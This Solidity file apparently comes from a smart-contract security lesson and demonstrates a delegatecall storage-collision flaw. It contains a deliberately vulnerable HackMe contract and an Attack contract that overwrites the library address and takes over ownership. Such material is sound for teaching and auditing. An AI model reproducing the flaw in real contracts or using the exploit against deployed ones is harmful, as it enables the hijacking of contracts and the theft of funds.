// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/*
Delegate call
A -> B
1. The memory layout of A and B should be same
2. Delegatecall preservs context hence the B will update the state variables of A
with the memory layout pointers declated in B

In this example the memory layout is not identical.
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        // since the memory layout is not identical
        // Lib will update the 1st layout in HackMe wich is Lib address
        // and future delegatecalls will be delegated to the new address set
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib in HackMe
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething()
        // in this contract below will be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
